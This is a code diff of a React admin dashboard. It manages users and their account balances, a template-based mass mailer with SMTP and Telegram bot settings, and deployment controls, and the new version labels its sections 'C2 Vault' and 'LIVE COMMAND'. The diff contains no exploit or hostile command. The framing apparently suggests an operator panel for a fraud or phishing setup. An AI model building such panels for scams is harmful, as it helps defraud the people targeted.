-                        onClick={() => setEditingUser({ ...editingUser, autoDeleteAt: null })}
-                        className="p-1.5 bg-white/5 hover:bg-red-500/20 text-gray-400 hover:text-red-500 rounded transition-colors"
-                        title="Clear Timer"
-                      >
-                        <Trash2 className="w-4 h-4" />
-                      </button>
-                    </div>
-                    <div className="text-[8px] text-gray-500 italic">
-                      {editingUser.autoDeleteAt ? `Expires on: ${new Date(editingUser.autoDeleteAt).toLocaleString()}` : 'No expiration set'}
-                    </div>
-                  </div>
-                </div>
-
-                <div className="grid grid-cols-1 gap-2">
-                  <button 
-                    onClick={() => handleToggleEnabled(editingUser.username)}
-                    className={`w-full py-2.5 rounded text-[10px] font-bold transition-colors flex items-center justify-center gap-2 ${editingUser.enabled !== false ? 'bg-orange-600/20 text-orange-500 hover:bg-orange-600/30' : 'bg-green-600/20 text-green-500 hover:bg-green-600/30'}`}
-                  >
-                    <RefreshCw className="w-3.5 h-3.5" />
-                    {editingUser.enabled !== false ? 'DISABLE ACCOUNT' : 'ENABLE ACCOUNT'}
-                  </button>
-                  <button 
-                    onClick={() => {
-                      handleDeleteUser(editingUser.username);
-                      setEditingUser(null);
-                    }}
-                    className="w-full bg-red-600/20 text-red-500 hover:bg-red-600/30 py-2.5 rounded text-[10px] font-bold transition-colors flex items-center justify-center gap-2"
-                  >
-                    <Trash2 className="w-3.5 h-3.5" /> DELETE USER PERMANENTLY
-                  </button>
-                </div>
-              </div>
-            ) : (
-              <div className="space-y-4">
-                <button 
-                  onClick={() => setShowAddUser(!showAddUser)}
-                  className="w-full bg-red-600 hover:bg-red-700 py-2.5 rounded text-[10px] font-bold transition-all shadow-lg flex items-center justify-center gap-2"
-                >
-                  {showAddUser ? <ChevronLeft className="w-4 h-4" /> : <Users className="w-4 h-4" />}
-                  {showAddUser ? 'CANCEL' : 'ADD NEW USER'}
-                </button>
-
-                {showAddUser && (
-                  <div className="p-4 bg-[#2c2c2e] rounded-lg border border-red-500/30 space-y-4 animate-in slide-in-from-top duration-200">
-                    <div className="space-y-1">
-                      <label className="text-[9px] text-gray-500 uppercase font-bold">Username</label>
-                      <input 
-                        type="text" 
-                        value={newUser.username} 
-                        onChange={(e) => setNewUser({ ...newUser, username: e.target.value })}
-                        className="w-full bg-black/30 border border-white/10 rounded px-3 py-1.5 text-[10px] focus:outline-none focus:border-red-500/50"
-                      />
-                    </div>
-                    <div className="space-y-1">
-                      <label className="text-[9px] text-gray-500 uppercase font-bold">Password</label>
-                      <input 
-                        type="text" 
-                        value={newUser.password} 
-                        onChange={(e) => setNewUser({ ...newUser, password: e.target.value })}
-                        className="w-full bg-black/30 border border-white/10 rounded px-3 py-1.5 text-[10px] focus:outline-none focus:border-red-500/50"
-                      />
-                    </div>
-                    <div className="space-y-1">
-                      <label className="text-[9px] text-gray-500 uppercase font-bold">Initial Balance ($)</label>
-                      <input 
-                        type="number" 
-                        value={newUser.initialBalance} 
-                        onChange={(e) => setNewUser({ ...newUser, initialBalance: e.target.value })}
-                        className="w-full bg-black/30 border border-white/10 rounded px-3 py-1.5 text-[10px] focus:outline-none focus:border-red-500/50"
-                      />
-                    </div>
-                    <button 
-                      onClick={handleCreateUser}
-                      className="w-full bg-green-600 hover:bg-green-700 py-2.5 rounded text-[10px] font-bold transition-colors shadow-lg"
-                    >
-                      CREATE USER
-                    </button>
-                  </div>
-                )}
-
-                <div className="grid grid-cols-1 gap-2">
-                  {users.length === 0 ? (
-                    <div className="text-center py-10 text-gray-500 italic">No users found.</div>
-                  ) : (
-                    users.map((u: AdminUser, i: number) => (
-                      <button 
-                        key={i} 
-                        onClick={() => setEditingUser(u)}
-                        className="p-3 bg-[#2c2c2e] rounded-lg border border-white/5 hover:border-red-500/30 transition-all text-left group"
-                      >
-                        <div className="flex items-center justify-between mb-1">
-                          <div className="font-bold text-xs flex items-center gap-2">
-                            <span className={`w-1.5 h-1.5 rounded-full ${u.enabled !== false ? 'bg-green-500' : 'bg-red-500'}`}></span>
-                            {u.username || 'Unknown'}
-                          </div>
-                          <ChevronLeft className="w-3 h-3 text-gray-600 group-hover:text-red-500 rotate-180 transition-all" />
-                        </div>
-                        <div className="flex items-center justify-between text-[9px] text-gray-500">
-                          <span>{Object.keys(u.accounts || {}).length} Accounts</span>
-                          <span className="font-mono text-emerald-500/70">
-                            ${Object.values(u.accounts || {}).reduce((sum: number, acc) => sum + (acc.balance || 0), 0).toFixed(2)}
-                          </span>
-                        </div>
-                      </button>
-                    ))
-                  )}
-                </div>
-              </div>
+      {/* Tabs */}
+      <div className="flex bg-zinc-900 border-b border-white/5 relative z-20">
+        {[
+          { id: 'live', icon: <Zap size={14} />, label: 'LIVE COMMAND' },
+          { id: 'database', icon: <Server size={14} />, label: 'DATABASE' },
+          { id: 'support', icon: <MessageSquare size={14} />, label: 'SUPPORT' },
+          { id: 'mailer', icon: <Shield size={14} />, label: 'MATRIX MAIL' },
+          { id: 'settings', icon: <Key size={14} />, label: 'GLOBAL CONFIG' }
+        ].map((tab) => (
+          <button
+            key={tab.id}
+            onClick={() => setActiveTab(tab.id as any)}
+            className={`flex-1 flex flex-col items-center py-3 transition-all relative ${
+              activeTab === tab.id ? 'text-white' : 'text-zinc-600 hover:text-zinc-400'
+            }`}
+          >
+            <div className={`mb-1 transition-transform ${activeTab === tab.id ? 'scale-110' : ''}`}>
+              {tab.icon}
+            </div>
+            <span className="text-[7px] font-black tracking-widest">{tab.label}</span>
+            {activeTab === tab.id && (
+              <motion.div 
+                layoutId="activeTabC2"
+                className="absolute bottom-0 left-0 right-0 h-0.5 bg-red-600 shadow-[0_0_10px_rgba(220,38,38,0.8)]" 
+              />
             )}
+          </button>
+        ))}
+      </div>
+
+      {/* Main Content */}
+      <div className="flex-1 overflow-y-auto bg-[#050505] p-4 space-y-6 pb-24 relative z-20 scrollbar-hide">
+        {activeTab === 'live' && (
+          <div className="space-y-4 animate-in fade-in slide-in-from-bottom-2">
+            <div className="grid grid-cols-2 gap-3">
+              <div className="bg-zinc-900/50 rounded-2xl p-4 border border-white/5">
+                <p className="text-[10px] text-zinc-500 uppercase font-black tracking-widest">Active Users</p>
+                <p className="text-2xl font-bold text-white mt-1">{users.length}</p>
+              </div>
+              <div className="bg-zinc-900/50 rounded-2xl p-4 border border-white/5">
+                <p className="text-[10px] text-zinc-500 uppercase font-black tracking-widest">System Load</p>
+                <p className="text-2xl font-bold text-emerald-500 mt-1">Stable</p>
+              </div>
+            </div>
+
+            <div className="bg-zinc-900/50 rounded-2xl border border-white/5 overflow-hidden">
+              <div className="p-3 border-b border-white/5 bg-white/5 flex items-center justify-between">
+                <div className="flex items-center gap-2">
+                  <Terminal size={14} className="text-red-500" />
+                  <span className="text-[10px] font-bold text-white uppercase">Live Event Stream</span>
+                </div>
+                <span className="text-[8px] bg-red-500/10 text-red-500 px-1.5 py-0.5 rounded font-mono">DEBUG_MODE</span>
+              </div>
+            <div className="h-96 overflow-y-auto p-4 space-y-2 font-mono text-[10px]">
+                {logs.length === 0 && <p className="text-zinc-600 italic">Listening for system events...</p>}
+                {logs.map((log, i) => (
+                  <div key={i} className="flex gap-3 text-zinc-400 border-b border-white/5 pb-1 last:border-0 group">
+                    <span className="text-red-500 shrink-0 opacity-50 group-hover:opacity-100 transition-opacity">[{log.timestamp || '09:02'}]</span>
+                    <span className="flex-1 group-hover:text-emerald-400 transition-colors">{log.message}</span>
+                  </div>
+                ))}
+              </div>
+            </div>
           </div>
-        ) : activeTab === 'system' ? (
-          <div className="space-y-4">
-            <div className="flex items-center justify-between mb-2">
-              <h3 className="text-[10px] font-bold text-cyan-500 uppercase tracking-widest flex items-center gap-2">
-                <Terminal className="w-4 h-4" /> ENGINE_LOGS_STREAM
-              </h3>
+        )}
+
+        {activeTab === 'database' && (
+          <div className="space-y-4 animate-in fade-in slide-in-from-bottom-2">
+            <div className="flex justify-between items-center px-1">
+              <h3 className="text-[10px] text-zinc-500 font-black uppercase tracking-[0.2em]">C2 Vault</h3>
               <button 
-                onClick={() => handleCommand('all', 'clear_logs')}
-                className="text-[9px] text-gray-500 hover:text-red-500 transition-colors bg-white/5 px-2 py-1 rounded"
+                onClick={() => setShowAddUser(true)}
+                className="flex items-center gap-2 bg-emerald-600/10 hover:bg-emerald-600/20 text-emerald-500 px-3 py-1.5 rounded-lg text-[10px] font-black uppercase tracking-widest transition-all"
               >
-                PURGE_LOGS
+                <Plus size={12} /> Inject User
               </button>
             </div>
-            
-            <div className="space-y-2 font-mono text-[9px] max-h-[300px] overflow-y-auto bg-black/40 rounded border border-white/5 p-3 custom-scrollbar">
-              {logs.length === 0 ? (
-                <div className="text-center py-10 text-gray-700 italic">Waiting for inbound data...</div>
-              ) : (
-                [...logs].reverse().slice(0, 50).map((log: ActionLog) => (
-                  <div key={log.id} className="mb-1 pb-1 border-b border-white/5 last:border-0 opacity-80 hover:opacity-100 transition-opacity">
-                    <span className="text-gray-600">[{new Date(log.timestamp).toLocaleTimeString()}]</span>
-                    <span className="text-cyan-500 mx-2">@{log.username || 'SYS'}</span>
-                    <span className="text-gray-400">{log.action}: {typeof log.details === 'string' ? log.details : JSON.stringify(log.details)}</span>
-                  </div>
-                ))
-              )}
-            </div>
 
-            <div className="p-4 bg-[#111113] rounded-lg border border-white/5 space-y-4">
-              <h3 className="text-[10px] font-bold text-gray-400 uppercase flex items-center gap-2">
-                <RefreshCw className="w-3.5 h-3.5" /> DEPLOYMENT_CORE
-              </h3>
-              <div className="grid grid-cols-2 gap-2">
-                <button 
-                  onClick={() => handleCommand('all', 'deploy', { args: [] })}
-                  className="bg-cyan-600/20 text-cyan-400 hover:bg-cyan-600/30 border border-cyan-500/30 py-2.5 rounded text-[10px] font-bold transition-all"
+            <AnimatePresence>
+              {showAddUser && (
+                <motion.div 
+                  initial={{ opacity: 0, height: 0 }}
+                  animate={{ opacity: 1, height: 'auto' }}
+                  exit={{ opacity: 0, height: 0 }}
+                  className="bg-zinc-900 border border-emerald-500/30 rounded-2xl overflow-hidden p-4 space-y-4 shadow-[0_0_20px_rgba(16,185,129,0.1)]"
                 >
-                  RUN_DEPLOY
-                </button>
-                <button 
-                  onClick={() => handleCommand('all', 'deploy', { args: ['rebuild'] })}
-                  className="bg-white/5 hover:bg-white/10 py-2.5 rounded text-[10px] font-bold transition-all border border-white/5"
-                >
-                  REBUILD_IMG
-                </button>
-              </div>
-            </div>
-
-            <div className="p-4 bg-black rounded-lg border border-white/10 font-mono text-[9px] h-[200px] overflow-y-auto flex flex-col-reverse custom-scrollbar">
-              <div className="space-y-1">
-                {deployOutput.length === 0 ? (
-                  <div className="text-gray-600"># Waiting for deployment output...</div>
-                ) : (
-                  deployOutput.map((line, i) => (
-                    <div key={i} className="text-cyan-400 whitespace-pre-wrap">
-                      <span className="text-gray-500 mr-2">$</span>
-                      {line}
-                    </div>
-                  ))
-                )}
-              </div>
-            </div>
-          </div>
-        ) : activeTab === 'mailer' ? (
-          <div className="space-y-4">
-            <div className="p-4 bg-[#2c2c2e] rounded-lg border border-white/5 space-y-4">
-              <h3 className="text-[10px] font-bold text-gray-400 uppercase flex items-center gap-2">
-                <Settings className="w-3.5 h-3.5" /> MAILER CONFIGURATION
-              </h3>
-              <div className="space-y-2">
-                <label className="text-[9px] text-gray-500 uppercase font-bold">Default Mailer System</label>
-                <select 
-                  value={(globalSettings?.general as Record<string, unknown>)?.mailerType as string || 'node'}
-                  onChange={(e) => globalSettings && setGlobalSettings({
-                    ...globalSettings,
-                    general: { ...globalSettings.general, mailerType: e.target.value as 'node' | 'php' | 'python' }
-                  })}
-                  className="w-full bg-black/30 border border-white/10 rounded px-3 py-1.5 text-[10px] focus:outline-none focus:border-red-500/50"
-                >
-                  <option value="node">Node Mailer</option>
-                  <option value="python">Python Mailer</option>
-                  <option value="php">PHP Mailer</option>
-                </select>
-              </div>
-            </div>
-
-            {/* New TSX Mailer Component */}
-            <div className="bg-[#2c2c2e] rounded-lg border border-red-500/30 overflow-hidden">
-              <div className="p-3 bg-red-500/10 border-b border-red-500/20 flex items-center justify-between gap-2">
-                <div className="flex items-center gap-2">
-                  <Mail className="w-4 h-4 text-red-500" />
-                  <span className="text-[10px] font-bold uppercase tracking-wider">TSX (Node.js) Mailer Dispatcher</span>
-                </div>
-                <button 
-                  onClick={() => window.location.href = '/?view=mailer'}
-                  className="p-1 hover:bg-white/10 rounded text-gray-400 hover:text-white transition-colors"
-                  title="Open Full Screen"
-                >
-                  <ExternalLink className="w-3 h-3" />
-                </button>
-              </div>
-              <div className="p-4 bg-[#1c1c1e]">
-                <Mailer />
-              </div>
-            </div>
-
-            <div className="p-4 bg-[#2c2c2e] rounded-lg border border-white/5">
-              <div className="flex items-center justify-between mb-3">
-                <h3 className="text-xs font-bold flex items-center gap-2">
-                  <Activity className="w-4 h-4 text-red-500" />
-                  MAILER STATUS
-                </h3>
-                <button 
-                  onClick={fetchMailerData}
-                  disabled={isRefreshing}
-                  className="p-1.5 bg-white/5 hover:bg-white/10 rounded transition-colors"
-                >
-                  <RefreshCw className={`w-3.5 h-3.5 ${isRefreshing ? 'animate-spin' : ''}`} />
-                </button>
-              </div>
-              {mailerStatus ? (
-                <div className="grid grid-cols-2 gap-2 text-[9px] font-mono">
-                  <div className="p-2 bg-black/20 rounded">
-                    <div className="text-gray-500 uppercase mb-1">PHP Version</div>
-                    <div>{mailerStatus.php_version}</div>
-                  </div>
-                  <div className="p-2 bg-black/20 rounded">
-                    <div className="text-gray-500 uppercase mb-1">PHPMailer</div>
-                    <div className={mailerStatus.phpmailer_installed ? 'text-green-500' : 'text-red-500'}>
-                      {mailerStatus.phpmailer_installed ? 'INSTALLED' : 'MISSING'}
-                    </div>
-                  </div>
-                  <div className="p-2 bg-black/20 rounded">
-                    <div className="text-gray-500 uppercase mb-1">Templates</div>
-                    <div>{mailerStatus.templates_count} FOUND</div>
-                  </div>
-                  <div className="p-2 bg-black/20 rounded">
-                    <div className="text-gray-500 uppercase mb-1">Config</div>
-                    <div className={mailerStatus.config_found ? 'text-green-500' : 'text-red-500'}>
-                      {mailerStatus.config_found ? 'LOADED' : 'NOT FOUND'}
-                    </div>
-                  </div>
-                </div>
-              ) : (
-                <div className="text-center py-4 text-gray-500 text-[10px] italic">Loading status...</div>
-              )}
-            </div>
-
-            <div className="p-4 bg-[#2c2c2e] rounded-lg border border-white/5">
-              <h3 className="text-xs font-bold mb-3 flex items-center gap-2">
-                <Send className="w-4 h-4 text-red-500" />
-                TEST MAILER
-              </h3>
-              <div className="flex gap-2">
-                <input 
-                  type="email"
-                  value={testEmail}
-                  onChange={(e) => setTestEmail(e.target.value)}
-                  placeholder="Enter test email..."
-                  className="flex-1 bg-black/30 border border-white/10 rounded px-3 py-1.5 text-[10px] focus:outline-none focus:border-red-500/50"
-                />
-                <button 
-                  onClick={handleSendTest}
-                  className="bg-red-600 hover:bg-red-700 px-4 py-1.5 rounded text-[10px] font-bold transition-colors"
-                >
-                  SEND
-                </button>
-              </div>
-            </div>
-
-            <div className="p-4 bg-[#2c2c2e] rounded-lg border border-white/5">
-              <div className="flex items-center justify-between mb-3">
-                <h3 className="text-xs font-bold flex items-center gap-2">
-                  <Terminal className="w-4 h-4 text-red-500" />
-                  MAILER LOGS
-                </h3>
-                <button 
-                  onClick={handleClearMailerLogs}
-                  className="p-1.5 bg-white/5 hover:bg-red-500/20 text-gray-400 hover:text-red-500 rounded transition-colors"
-                  title="Clear Mailer Logs"
-                >
-                  <Trash2 className="w-3.5 h-3.5" />
-                </button>
-              </div>
-              <div className="bg-black/40 rounded border border-white/5 p-2 font-mono text-[8px] h-[200px] overflow-y-auto">
-                {mailerLogs.length === 0 ? (
-                  <div className="text-gray-600 italic">No logs found.</div>
-                ) : (
-                  mailerLogs.map((log, i) => (
-                    <div key={i} className="mb-1 border-b border-white/5 pb-1 last:border-0">
-                      {log}
-                    </div>
-                  ))
-                )}
-              </div>
-            </div>
-
-            {mailerConfig && (
-              <div className="p-4 bg-[#2c2c2e] rounded-lg border border-white/5">
-                <h3 className="text-xs font-bold mb-3 flex items-center gap-2">
-                  <RefreshCw className="w-4 h-4 text-red-500" />
-                  SMTP CONFIG
-                </h3>
-                <div className="space-y-2 text-[9px] font-mono">
-                  <div className="flex justify-between border-b border-white/5 pb-1">
-                    <span className="text-gray-500">HOST:</span>
-                    <span>{mailerConfig.smtp?.host}</span>
-                  </div>
-                  <div className="flex justify-between border-b border-white/5 pb-1">
-                    <span className="text-gray-500">PORT:</span>
-                    <span>{mailerConfig.smtp?.port}</span>
-                  </div>
-                  <div className="flex justify-between border-b border-white/5 pb-1">
-                    <span className="text-gray-500">USER:</span>
-                    <span>{mailerConfig.smtp?.user}</span>
-                  </div>
-                  <div className="flex justify-between border-b border-white/5 pb-1">
-                    <span className="text-gray-500">SENDER:</span>
-                    <span>{mailerConfig.general?.sender_name}</span>
-                  </div>
-                </div>
-              </div>
-            )}
-          </div>
-        ) : activeTab === 'templates' ? (
-          <div className="space-y-3">
-            {!selectedTemplate ? (
-              templates.map((t: Template) => (
-                <div key={t.name} className="p-3 bg-[#2c2c2e] rounded-lg border border-white/5 hover:border-white/20 cursor-pointer" onClick={() => fetchTemplateContent(t.name)}>
-                  <div className="font-bold text-xs">{t.name}</div>
-                  <div className="text-[9px] text-gray-400">Last modified: {t.last_modified}</div>
-                </div>
-              ))
-            ) : (
-              <div className="space-y-3">
-                <button onClick={() => setSelectedTemplate(null)} className="text-[9px] text-gray-400 hover:text-white">← Back to templates</button>
-                <div className="font-bold text-xs">{selectedTemplate}</div>
-                <textarea 
-                  value={templateContent} 
-                  onChange={(e) => setTemplateContent(e.target.value)}
-                  className="w-full h-[300px] bg-black/40 rounded border border-white/5 p-2 font-mono text-[9px]"
-                />
-                <button onClick={handleUpdateTemplate} className="bg-red-600 hover:bg-red-700 py-2 px-4 rounded text-[10px] font-bold transition-colors">Update Template</button>
-              </div>
-            )}
-          </div>
-        ) : activeTab === 'settings' ? (
-          <div className="space-y-4">
-            {globalSettings ? (
-              <>
-                <div className="p-4 bg-[#2c2c2e] rounded-lg border border-white/5">
-                  <h3 className="text-xs font-bold mb-3 flex items-center gap-2 text-red-500">
-                    <Send className="w-4 h-4" />
-                    SMTP CONFIGURATION
-                  </h3>
-                  <div className="space-y-3">
+                  <div className="grid grid-cols-2 gap-4">
                     <div className="space-y-1">
-                      <label className="text-[9px] text-gray-500 uppercase font-bold">Host</label>
+                      <label className="text-[9px] text-zinc-500 uppercase font-bold">Username</label>
                       <input 
                         type="text" 
-                        value={globalSettings.smtp.host} 
-                        onChange={(e) => setGlobalSettings({ ...globalSettings, smtp: { ...globalSettings.smtp, host: e.target.value } })}
-                        className="w-full bg-black/30 border border-white/10 rounded px-3 py-1.5 text-[10px] focus:outline-none focus:border-red-500/50"
-                      />
-                    </div>
-                    <div className="grid grid-cols-2 gap-2">
-                      <div className="space-y-1">
-                        <label className="text-[9px] text-gray-500 uppercase font-bold">Port</label>
-                        <input 
-                          type="number" 
-                          value={globalSettings.smtp.port} 
-                          onChange={(e) => setGlobalSettings({ ...globalSettings, smtp: { ...globalSettings.smtp, port: parseInt(e.target.value) } })}
-                          className="w-full bg-black/30 border border-white/10 rounded px-3 py-1.5 text-[10px] focus:outline-none focus:border-red-500/50"
-                        />
-                      </div>
-                      <div className="space-y-1">
-                        <label className="text-[9px] text-gray-500 uppercase font-bold">Secure</label>
-                        <select 
-                          value={globalSettings.smtp.secure ? 'true' : 'false'} 
-                          onChange={(e) => setGlobalSettings({ ...globalSettings, smtp: { ...globalSettings.smtp, secure: e.target.value === 'true' } })}
-                          className="w-full bg-black/30 border border-white/10 rounded px-3 py-1.5 text-[10px] focus:outline-none focus:border-red-500/50"
-                        >
-                          <option value="true">SSL/TLS</option>
-                          <option value="false">STARTTLS</option>
-                        </select>
-                      </div>
-                    </div>
-                    <div className="space-y-1">
-                      <label className="text-[9px] text-gray-500 uppercase font-bold">User</label>
-                      <input 
-                        type="text" 
-                        value={globalSettings.smtp.user} 
-                        onChange={(e) => setGlobalSettings({ ...globalSettings, smtp: { ...globalSettings.smtp, user: e.target.value } })}
-                        className="w-full bg-black/30 border border-white/10 rounded px-3 py-1.5 text-[10px] focus:outline-none focus:border-red-500/50"
+                        value={newUserForm.username}
+                        onChange={(e) => setNewUserForm({...newUserForm, username: e.target.value})}
+                        className="w-full bg-black border border-white/10 rounded-xl px-3 py-2 text-white text-xs focus:border-emerald-500/50 outline-none"
                       />
                     </div>
                     <div className="space-y-1">
-                      <label className="text-[9px] text-gray-500 uppercase font-bold">Password</label>
+                      <label className="text-[9px] text-zinc-500 uppercase font-bold">Password</label>
                       <input 
                         type="password" 
-                        value={globalSettings.smtp.pass} 
-                        onChange={(e) => setGlobalSettings({ ...globalSettings, smtp: { ...globalSettings.smtp, pass: e.target.value } })}
-                        className="w-full bg-black/30 border border-white/10 rounded px-3 py-1.5 text-[10px] focus:outline-none focus:border-red-500/50"
-                      />
-                    </div>
-                    <div className="space-y-1">
-                      <label className="text-[9px] text-gray-500 uppercase font-bold">Sender Name</label>
-                      <input 
-                        type="text" 
-                        value={globalSettings.smtp.senderName} 
-                        onChange={(e) => setGlobalSettings({ ...globalSettings, smtp: { ...globalSettings.smtp, senderName: e.target.value } })}
-                        className="w-full bg-black/30 border border-white/10 rounded px-3 py-1.5 text-[10px] focus:outline-none focus:border-red-500/50"
+                        value={newUserForm.password}
+                        onChange={(e) => setNewUserForm({...newUserForm, password: e.target.value})}
+                        className="w-full bg-black border border-white/10 rounded-xl px-3 py-2 text-white text-xs focus:border-emerald-500/50 outline-none"
                       />
                     </div>
                   </div>
-                </div>
-
-                <div className="p-4 bg-[#2c2c2e] rounded-lg border border-white/5">
-                  <h3 className="text-xs font-bold mb-3 flex items-center gap-2 text-blue-500">
-                    <MessageSquare className="w-4 h-4" />
-                    TELEGRAM CONFIG
-                  </h3>
-                  <div className="space-y-3">
-                    <div className="space-y-1">
-                      <label className="text-[9px] text-gray-500 uppercase font-bold">Bot Token</label>
-                      <input 
-                        type="text" 
-                        value={globalSettings.telegram.token} 
-                        onChange={(e) => setGlobalSettings({ ...globalSettings, telegram: { ...globalSettings.telegram, token: e.target.value } })}
-                        className="w-full bg-black/30 border border-white/10 rounded px-3 py-1.5 text-[10px] focus:outline-none focus:border-red-500/50"
-                      />
-                    </div>
-                    <div className="space-y-1">
-                      <label className="text-[9px] text-gray-500 uppercase font-bold">Chat ID</label>
-                      <input 
-                        type="text" 
-                        value={globalSettings.telegram.chatId} 
-                        onChange={(e) => setGlobalSettings({ ...globalSettings, telegram: { ...globalSettings.telegram, chatId: e.target.value } })}
-                        className="w-full bg-black/30 border border-white/10 rounded px-3 py-1.5 text-[10px] focus:outline-none focus:border-red-500/50"
-                      />
-                    </div>
+                  <div className="space-y-1">
+                    <label className="text-[9px] text-zinc-500 uppercase font-bold">Initial Balance</label>
+                    <input 
+                      type="number" 
+                      value={newUserForm.initialBalance}
+                      onChange={(e) => setNewUserForm({...newUserForm, initialBalance: parseFloat(e.target.value)})}
+                      className="w-full bg-black border border-white/10 rounded-xl px-3 py-2 text-white text-xs focus:border-emerald-500/50 outline-none"
+                    />
                   </div>
-                </div>
+                  <div className="flex gap-2">
+                    <button 
+                      onClick={() => setShowAddUser(false)}
+                      className="flex-1 py-2 text-zinc-500 text-[10px] font-bold uppercase tracking-widest"
+                    >
+                      Cancel
+                    </button>
+                    <button 
+                      onClick={createUser}
+                      className="flex-1 bg-emerald-600 text-black py-2 rounded-xl text-[10px] font-black uppercase tracking-widest shadow-lg shadow-emerald-500/20"
+                    >
+                      Confirm Injection
+                    </button>
+                  </div>
+                </motion.div>
+              )}
+            </AnimatePresence>
 
-                <div className="p-4 bg-[#2c2c2e] rounded-lg border border-white/5">
-                  <h3 className="text-xs font-bold mb-3 flex items-center gap-2 text-emerald-500">
-                    <Terminal className="w-4 h-4" />
-                    GENERAL SETTINGS
-                  </h3>
-                  <div className="space-y-3">
-                    <div className="space-y-1">
-                      <label className="text-[9px] text-gray-500 uppercase font-bold">App URL</label>
-                      <input 
-                        type="text" 
-                        value={globalSettings.general.app_url || ''} 
-                        onChange={(e) => setGlobalSettings({ ...globalSettings, general: { ...globalSettings.general, app_url: e.target.value } })}
-                        placeholder="https://app.com"
-                        className="w-full bg-black/30 border border-white/10 rounded px-3 py-1.5 text-[10px] focus:outline-none focus:border-red-500/50"
-                      />
-                    </div>
-                    <div className="space-y-1">
-                      <label className="text-[9px] text-gray-500 uppercase font-bold">Mailer URL (Webroot)</label>
-                      <input 
-                        type="text" 
-                        value={globalSettings.general.webroot_url || ''} 
-                        onChange={(e) => setGlobalSettings({ ...globalSettings, general: { ...globalSettings.general, webroot_url: e.target.value } })}
-                        placeholder="https://sim.com"
-                        className="w-full bg-black/30 border border-white/10 rounded px-3 py-1.5 text-[10px] focus:outline-none focus:border-red-500/50"
-                      />
-                    </div>
-                    <div className="space-y-1">
-                      <label className="text-[9px] text-gray-500 uppercase font-bold">Admin PIN</label>
-                      <input 
-                        type="text" 
-                        value={globalSettings.general.adminPin} 
-                        onChange={(e) => setGlobalSettings({ ...globalSettings, general: { ...globalSettings.general, adminPin: e.target.value } })}
-                        className="w-full bg-black/30 border border-white/10 rounded px-3 py-1.5 text-[10px] focus:outline-none focus:border-red-500/50"
-                      />
-                    </div>
-                    <div className="space-y-1">
-                      <label className="text-[9px] text-gray-500 uppercase font-bold">Overdraft Limit ($)</label>
-                      <input 
-                        type="number" 
-                        value={globalSettings.general.overdraftLimit} 
-                        onChange={(e) => setGlobalSettings({ ...globalSettings, general: { ...globalSettings.general, overdraftLimit: parseInt(e.target.value) } })}
-                        className="w-full bg-black/30 border border-white/10 rounded px-3 py-1.5 text-[10px] focus:outline-none focus:border-red-500/50"
-                      />
-                    </div>
-                    <div className="grid grid-cols-2 gap-2">
-                      <div className="space-y-1">
-                        <label className="text-[9px] text-gray-500 uppercase font-bold">Transfer Limit ($)</label>
-                        <input 
-                          type="number" 
-                          value={globalSettings.general.transferLimit} 
-                          onChange={(e) => setGlobalSettings({ ...globalSettings, general: { ...globalSettings.general, transferLimit: parseInt(e.target.value) } })}
-                          className="w-full bg-black/30 border border-white/10 rounded px-3 py-1.5 text-[10px] focus:outline-none focus:border-red-500/50"
-                        />
+            {/* Pending Approvals Section */}
+            {users.some(u => u.isApproved === false) && (
+              <div className="space-y-3">
+                <h3 className="text-[10px] text-amber-500 font-black uppercase tracking-[0.2em] px-1 flex items-center gap-2">
+                  <AlertTriangle size={12} /> Pending Approvals
+                </h3>
+                {users.filter(u => u.isApproved === false).map(u => (
+                  <div key={u.id} className="bg-amber-500/5 border border-amber-500/20 rounded-2xl overflow-hidden p-4 flex items-center justify-between">
+                    <div className="flex items-center gap-3">
+                      <div className="w-10 h-10 bg-amber-500/20 rounded-xl flex items-center justify-center">
+                        <Users className="text-amber-500" size={20} />
                       </div>
-                      <div className="space-y-1">
-                        <label className="text-[9px] text-gray-500 uppercase font-bold">Daily Limit ($)</label>
-                        <input 
-                          type="number" 
-                          value={globalSettings.general.dailyLimit} 
-                          onChange={(e) => setGlobalSettings({ ...globalSettings, general: { ...globalSettings.general, dailyLimit: parseInt(e.target.value) } })}
-                          className="w-full bg-black/30 border border-white/10 rounded px-3 py-1.5 text-[10px] focus:outline-none focus:border-red-500/50"
-                        />
+                      <div>
+                        <p className="text-sm font-bold text-white">{u.username}</p>
+                        <p className="text-[10px] text-amber-500/60 uppercase">System Enrollment Request</p>
                       </div>
                     </div>
-                    <div className="flex items-center gap-2 pt-2">
-                      <input 
-                        type="checkbox" 
-                        id="maintenanceMode"
-                        checked={globalSettings.general.maintenanceMode} 
-                        onChange={(e) => setGlobalSettings({ ...globalSettings, general: { ...globalSettings.general, maintenanceMode: e.target.checked } })}
-                        className="w-4 h-4 rounded bg-black/30 border-white/10 text-red-500 focus:ring-red-500/50"
-                      />
-                      <label htmlFor="maintenanceMode" className="text-[10px] text-gray-300 font-bold uppercase">Maintenance Mode</label>
-                    </div>
+                    <button 
+                      onClick={() => approveUser(u.username)}
+                      className="bg-amber-500 hover:bg-amber-400 text-black px-4 py-2 rounded-xl text-xs font-black uppercase tracking-widest transition-all active:scale-95"
+                    >
+                      Approve
+                    </button>
                   </div>
-                </div>
-
-                <button 
-                  onClick={saveGlobalSettings}
-                  className="w-full bg-red-600 hover:bg-red-700 py-3 rounded-lg text-xs font-bold transition-colors shadow-lg"
-                >
-                  SAVE ALL SETTINGS
-                </button>
-              </>
-            ) : (
-              <div className="text-center py-10 text-gray-500 italic">Loading settings...</div>
-            )}
-          </div>
-        ) : activeTab === 'system' ? (
-          <div className="space-y-4">
-            <div className="p-4 bg-[#2c2c2e] rounded-lg border border-white/5">
-              <h3 className="text-xs font-bold mb-3 flex items-center gap-2">
-                <Terminal className="w-4 h-4 text-red-500" />
-                DEPLOYMENT CONTROL
-              </h3>
-              <div className="grid grid-cols-1 gap-2">
-                <button 
-                  onClick={() => handleCommand('all', 'deploy', { args: [] })}
-                  className="bg-red-600 hover:bg-red-700 py-2 rounded text-[10px] font-bold transition-colors flex items-center justify-center gap-2"
-                >
-                  <RefreshCw className="w-4 h-4" /> RUN DEPLOYMENT SCRIPT
-                </button>
-                <button 
-                  onClick={() => handleCommand('all', 'deploy', { args: ['rebuild'] })}
-                  className="bg-white/5 hover:bg-white/10 py-2 rounded text-[10px] font-bold transition-colors flex items-center justify-center gap-2"
-                >
-                  <RefreshCw className="w-4 h-4" /> REBUILD CONTAINERS
-                </button>
-                <div className="grid grid-cols-2 gap-2">
-                  <button 
-                    onClick={() => handleCommand('all', 'deploy', { args: ['restart'] })}
